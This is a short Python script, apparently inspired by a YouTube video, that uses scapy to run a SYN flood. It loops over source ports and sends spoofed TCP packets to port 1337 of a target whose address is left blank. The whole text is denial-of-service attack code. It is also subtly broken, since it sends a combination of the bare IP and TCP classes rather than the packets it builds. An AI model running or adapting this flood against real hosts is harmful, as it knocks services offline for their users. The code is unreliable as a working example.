# inspire from: https://www.youtube.com/watch?v=VgwASWaksJE

from scapy.all import *

def synFlood(_src, _tgt):
    for port in range(1024, 65535):  # 64511 by all
        _ip = IP(src = _src, dst = _tgt)
        _tcp = TCP(sport = port, dport = 1337)
        pkt = IP/TCP
        send(pkt)

src = '127.0.0.1'
tgt = ''
synFlood(src, tgt)
